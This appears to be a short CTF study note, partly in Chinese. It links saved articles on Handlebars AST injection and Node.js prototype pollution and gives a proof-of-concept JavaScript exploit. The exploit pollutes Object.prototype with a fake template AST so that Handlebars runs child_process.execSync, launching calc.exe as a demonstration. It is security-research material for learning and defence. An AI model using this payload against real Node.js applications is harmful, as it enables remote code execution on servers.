## 文章

[Handlebars AST注入 _ Tyaoo's Blog](F:\LocalCTF\Handlebars AST注入 _ Tyaoo's Blog.html)

[NodeJS - __proto__ & prototype Pollution - HackTricks](F:\LocalCTF\NodeJS - __proto__ & prototype Pollution - HackTricks.html)

[AST注入 - 先知社区](F:\LocalCTF\AST注入 - 先知社区.html)

## POC

```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('calc.exe').toString())"
    }],
    "loc": {
        "start": 0
    }
}];


var source = "<h1>It works!</h1>";
var template = Handlebars.compile(source);
console.log(template({}));
```

